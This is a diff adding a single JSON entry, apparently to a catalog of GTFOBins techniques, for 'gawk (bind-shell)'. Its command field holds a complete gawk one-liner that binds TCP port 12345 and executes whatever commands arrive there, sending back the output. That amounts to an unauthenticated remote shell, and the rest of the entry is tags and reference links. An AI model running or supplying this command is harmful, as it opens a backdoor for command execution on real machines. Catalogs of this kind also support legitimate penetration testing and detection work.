@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-gawk-bind-shell",
+  "name": "GTFOBins · gawk (bind-shell)",
+  "command": "gawk 'BEGIN {\n    s = \"/inet/tcp/12345/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",
+  "description": "Use gawk to bind shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "gawk",
+    "bind-shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/gawk/#bind-shell",
+  "upstream_id": "gawk/bind-shell/0",
+  "category": "gtfobins",
+  "subcategory": "bind-shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/gawk/"
+    }
+  ]
+}
